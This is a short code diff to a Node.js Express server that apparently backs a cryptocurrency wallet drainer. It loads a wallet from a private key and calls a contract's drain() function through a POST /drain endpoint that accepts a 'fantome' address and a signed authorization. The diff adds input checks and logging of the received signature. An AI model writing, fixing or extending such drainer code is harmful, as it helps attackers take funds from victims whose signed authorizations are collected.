@@ -10,7 +10,7 @@ const provider = new JsonRpcProvider(RPC);
 const wallet = new Wallet(PK, provider);
 const iface = new Interface(["function drain()"]);
 
-const clean = (h) => (h.startsWith("0x") ? h.slice(2) : h);
+const clean = (h) => (typeof h === "string" && h.startsWith("0x") ? h.slice(2) : h);
 
 const app = express();
 app.use(cors());
@@ -20,6 +20,12 @@ app.post("/drain", async (req, res) => {
   try {
     const { fantome, auth } = req.body;
     if (!fantome || !auth) return res.status(400).json({ error: "fantome/auth manquant" });
+
+    console.log("AUTH RECU:", JSON.stringify(auth));
+
+    if (!auth.r || !auth.s) {
+      return res.status(400).json({ error: "r ou s manquant dans auth" });
+    }
 
     let yp = auth.yParity;
     if (typeof yp === "string" && yp.startsWith("0x")) yp = parseInt(yp, 16);
